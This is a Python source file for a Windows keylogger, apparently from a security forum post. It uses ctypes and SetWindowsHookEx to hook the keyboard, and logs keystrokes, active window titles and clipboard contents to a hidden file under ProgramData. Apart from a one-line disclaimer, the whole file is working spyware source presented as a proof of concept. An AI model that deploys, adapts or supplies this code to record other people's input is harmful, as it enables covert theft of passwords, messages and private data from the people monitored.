# KEYLOGGER WITH CTYPES AND SETWINDOWSHOOKEX FROM MY 0X00SEC POST.
# THIS IS A PROOF-OF-CONCEPT AND I AM NOT RESPONSIBLE FOR ANY 
# USAGE OF THIS CODE OR MALICIOUS PURPOSE.

from ctypes import *
from ctypes.wintypes import DWORD, LPARAM, WPARAM, MSG
import logging
import os

logging.basicConfig(filename='/ProgramData/ram.txt', 
                    level=logging.INFO, format='%(message)s')

# Load the required librairies
user32 = windll.user32
kernel32 = windll.kernel32


current_window = None   # Holds the current window title
current_clipboard = []  # Holds the current clipboard content
last_key = None         # Holds the last key pressed
line = ""               # Holds the lines of keyboard characters pressed


WH_KEYBOARD_LL = 13     # Hook ID to pass to SetWindowsExA
WM_KEYDOWN = 0x0100     # VM_KEYDOWN message code
HC_ACTION = 0           # Parameter for KeyboardProc callback function

# VIRTUAL KEYS CODES: Needed to handle special keys such as CTRL or RETURN
# Reference: http://nehe.gamedev.net/article/msdn_virtualkey_codes/15009/
VIRTUAL_KEYS = {'RETURN': 0x0D,
                'CONTROL': 0x11,
                'SHIFT': 0x10,
                'MENU': 0x12,
                'TAB': 0x09,
                'BACKSPACE': 0x08,
                'CLEAR': 0x0C,
                'CAPSLOCK': 0x14,
                'ESCAPE': 0x1B,
                'HOME': 0x24,
                'INS': 0x2D,
                'DEL': 0x2E,
                'END': 0x23,
                'PRINTSCREEN': 0x2C,
                'CANCEL': 0x03,
                'BACK': 0x08,
                'LBUTTON': 0x01
                }

HOOKPROC = WINFUNCTYPE(HRESULT, c_int, WPARAM, LPARAM) # Callback function

class KBDLLHOOKSTRUCT(Structure): _fields_=[ 
    ('vkCode',DWORD),
    ('scanCode',DWORD),
    ('flags',DWORD),
    ('time',DWORD),
    ('dwExtraInfo',DWORD)]

class hook:
    """
    Class for installing/uninstalling a hook
    """

    def __init__(self):
        """
        Constructor for the hook class.

        Responsible for allowing methods to call functions from
        user32.dll and kernel32.dll.
        """
        self.user32 = user32
        self.kernel32 = kernel32
        self.is_hooked = None


    def install_hook(self, ptr):
        """
        Method for installing hook.

        Arguments
            ptr: pointer to the HOOKPROC callback function
        """
        self.is_hooked = self.user32.SetWindowsHookExA(
            WH_KEYBOARD_LL,
            ptr,
            kernel32.GetModuleHandleW(None),
            0
        )

        if not self.is_hooked:
            return False
        return True

    def uninstall_hook(self):
        """
        Method for uninstalling the hook.
        """

        if self.is_hooked is None:
            return
        self.user32.UnhookWindowsHookEx(self.is_hooked)
        self.is_hooked = None


def get_current_window(): # Function to grab the current window and its title

    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTextLengthW
    GetWindowText = user32.GetWindowTextW

    hwnd = GetForegroundWindow() # Get handle to foreground window
    length = GetWindowTextLength(hwnd) # Get length of the window text in title bar
    buff = create_unicode_buffer(length + 1) # Create buffer to store the window title buff
    
    GetWindowText(hwnd, buff, length + 1) # Get window title and store in buff

    return buff.value # Return the value of buff

def get_clipboard():
    
    CF_TEXT = 1 # Set clipboard format

    # Argument and return types for GlobalLock/GlobalUnlock.
    kernel32.GlobalLock.argtypes = [c_void_p]
    kernel32.GlobalLock.restype = c_void_p
    kernel32.GlobalUnlock.argtypes = [c_void_p]

    # Return type for GetClipboardData
    user32.GetClipboardData.restype = c_void_p
    user32.OpenClipboard(0)
    
    # Required clipboard functions
    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
    GetClipboardData = user32.GetClipboardData
    CloseClipboard = user32.CloseClipboard

    try:
        if IsClipboardFormatAvailable(CF_TEXT): # If CF_TEXT is available
            data = GetClipboardData(CF_TEXT) # Get handle to data in clipboard
            data_locked = kernel32.GlobalLock(data) # Get ptr to memory location where the data is located
            text = c_char_p(data_locked) # Get a char * ptr (buff in Python) to the location of data_locked
            value = text.value # Dump the content in value
            kernel32.GlobalUnlock(data_locked) # Decrement de lock count
            return value.decode('latin1') # Return the clipboard content
    finally:
        CloseClipboard() # Close the clipboard

def hook_procedure(nCode, wParam, lParam):
    """
    Hook procedure to monitor and log keyboard events.

    Arguments:
        nCode       = HC_ACTION code
        wParam      = Keyboard event message code
        lParam      = Address of keyboard input event

    """

    # Need to be global so they're not emptied at every key pressed
    global last_key
    global current_clipboard
    global line
    global current_window

    if current_window != get_current_window():
        current_window = get_current_window()
        logging.info('[WINDOW] ' + current_window)
    
    
    # Remove comments below if you want to the possibility to uninstall the hook when testing.
    """
    if user32.GetKeyState(VIRTUAL_KEYS['CONTROL']) & 0x8000:
        hook.uninstall_hook()
        return 0
    """

    if nCode == HC_ACTION and wParam == WM_KEYDOWN:

        kb = KBDLLHOOKSTRUCT.from_address(lParam)
        user32.GetKeyState(VIRTUAL_KEYS['SHIFT'])
        user32.GetKeyState(VIRTUAL_KEYS['MENU'])
        state = (c_char * 256)()
        user32.GetKeyboardState(byref(state))
        buff = create_unicode_buffer(8)
        n = user32.ToUnicode(kb.vkCode, kb.scanCode, state, buff, 8 - 1, 0)
        key = wstring_at(buff)     # Key pressed as buffer
        if n > 0:

            # Avoid logging weird characters. If they show up,
            # get the hex code here http://asciivalue.com/index.php
            # and add to VIRTUAL_KEYS
            if kb.vkCode not in VIRTUAL_KEYS.values():
                line += key

            for key, value in VIRTUAL_KEYS.items(): 
                if kb.vkCode == value:
                    logging.info(key)

            if kb.vkCode == VIRTUAL_KEYS['RETURN']:
                logging.info(line)
                line = ""

            if current_clipboard != get_clipboard():
                current_clipboard = get_clipboard()
                logging.info('[CLIPBOARD] ' + current_clipboard + '\n')

    return user32.CallNextHookEx(hook.is_hooked, nCode, wParam, c_ulonglong(lParam))

hook = hook()                           # Hook class
ptr = HOOKPROC(hook_procedure)          # Pointer to the callback function
hook.install_hook(ptr)                  # Installing hook
msg = MSG()                             # MSG data structure
user32.GetMessageA(byref(msg), 0, 0, 0) # Wait for messages to be posted
